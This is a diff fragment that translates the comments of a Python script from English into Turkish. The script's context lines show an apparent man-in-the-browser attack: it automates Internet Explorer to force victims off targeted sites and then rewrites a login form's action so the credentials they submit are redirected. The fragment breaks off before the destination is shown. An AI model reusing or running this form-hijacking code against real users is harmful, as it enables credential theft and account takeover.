@@ -32,7 +32,7 @@ windows = win32com.client.Dispatch(clsid)
 
 
 def wait_for_browser(browser):
-    # wait for the browser to finish loading a page
+    # tarayıcının bir sayfayı yüklemeyi bitirmesini bekleyin
     while browser.ReadyState != 4 and browser.ReadyState != "complete":
         time.sleep(0.1)
     return
@@ -44,24 +44,24 @@ while True:
         if url.hostname in target_sites:
             if target_sites[url.hostname]["owned"]:
                 continue
-            # if there is a URL we can just redirect
+            # bir URL varsa onu yönlendirebiliriz
             if target_sites[url.hostname]["logout_url"]:
                 browser.Navigate(target_sites[url.hostname]["logout_url"])
                 wait_for_browser(browser)
             else:
-                # retrieve all elements in the document
+                # belgedeki tüm öğeleri al
                 full_doc = browser.Document.all
-                # iterate looking for the logout form
+                # çıkış formunu aramayı tekrarla
                 for i in full_doc:
                     try:
-                        # find the logout form and submit it
+                        # çıkış formunu bul ve gönder
                         if i.id == target_sites[url.hostname]["logout_form"]:
                             i.submit()
                             wait_for_browser(browser)
                     except:
                         pass
             try:
-                # now we modify the login form
+                # şimdi giriş formunu değiştirelim
                 login_index = target_sites[url.hostname]["login_form_index"]
                 login_page = urllib.parse.quote(browser.LocationUrl)
                 browser.Document.forms[login_index].action = "%s%s" % (
